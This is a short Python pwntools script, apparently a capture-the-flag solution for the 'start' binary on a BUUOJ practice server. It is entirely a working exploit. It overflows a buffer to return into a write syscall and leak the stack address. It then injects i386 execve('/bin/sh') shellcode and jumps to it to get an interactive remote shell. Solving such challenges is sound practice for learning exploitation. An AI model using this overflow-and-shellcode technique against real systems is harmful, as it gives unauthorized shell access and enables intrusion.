from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 26190)
elf = ELF('../start')

# return to syscall write, leak esp.
payload = b'a' * 0x14 + p32(0x8048087)
target.sendafter(':', payload)
stack = u32(target.recv(4))

shellcode = asm('''
  xor edx, edx
  xor ecx, ecx        
  push 0x0068732f 
  push 0x6e69622f ; /bin/sh00
  mov ebx, esp
  mov al, 0xb
  int 0x80
''')

payload = b'a' * 0x14 + p32(stack + 0x14) + shellcode
target.send(payload)
target.interactive()